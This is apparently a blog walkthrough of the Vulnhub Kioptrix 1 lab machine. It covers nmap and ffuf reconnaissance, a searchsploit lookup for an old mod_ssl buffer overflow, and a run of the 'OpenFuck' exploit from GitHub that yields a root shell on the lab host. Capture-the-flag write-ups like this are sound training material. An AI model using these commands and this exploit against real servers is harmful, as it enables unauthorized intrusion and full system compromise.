---
layout: post
title: Vulnhub Kioptrix 1 Walkthrough
categories: [Vulnhub]
tags: [ linux]
toc: true
image:
  path: "/assets/images/kioptrix1/vuln.png"
  alt: Vulnhub Kioptrix1
---


Kioptrix 1 was an easy box to root , using kernel exploit and getting foothold by abusing an old mod ssl 

## Recon

nmap scan show 5 ports open : 

* ssh : 22
* 80: http
* 111 : rpcbind
* 443 : https
* 139 : netbios-ssn

```bash

root@kali nmap -p- -sC -sV 192.168.1.104 --min-rate=10000 -v

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp  open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

```
## Port 80

i'll start with port 80 because web has a large attacking surface 

![http80](/assets/images/kioptrix1/index.png)

ffuzing the web using fuff didn't yiel much interesting results , just static pages :

```bash

ffuf -u http://192.168.1.104/FUZZ -w /oscp/wl/raft-medium-words.txt -mc all -ac -c -v

[Status: 301, Size: 293, Words: 19, Lines: 10, Duration: 35ms]
| URL | http://192.168.1.104/usage
    * FUZZ: usage

[Status: 301, Size: 294, Words: 19, Lines: 10, Duration: 151ms]
| URL | http://192.168.1.104/manual
    * FUZZ: manual

[Status: 301, Size: 292, Words: 19, Lines: 10, Duration: 118ms]
| URL | http://192.168.1.104/mrtg

```

Navigating to http://192.168.1.104/usage gives us a dashboard for usage statistics :

![http80](/assets/images/kioptrix1/usage.png)

## Port 443

I shifted my focus to port 443 , the first thing i noticed in nmap result was the old mod ssl version 

```bash
 mod_ssl/2.8.4
```

so by using searchsploit we can see a existing exploit :

```bash

searchsploit mod ssl

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                           | unix/remote/47080.c

```
## Root Shell
But by searching around i found an updated version in github that gives us a root shell directly :

```bash

https://github.com/heltonWernik/OpenLuck
```

 I'll follow the steps mentionned in the page and choose 0x6b target for redhat as shown in the exploit target list : 

```bash
./OpenFuck 0x6b 192.168.1.104 443

[+] Attached to 6505
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root

```

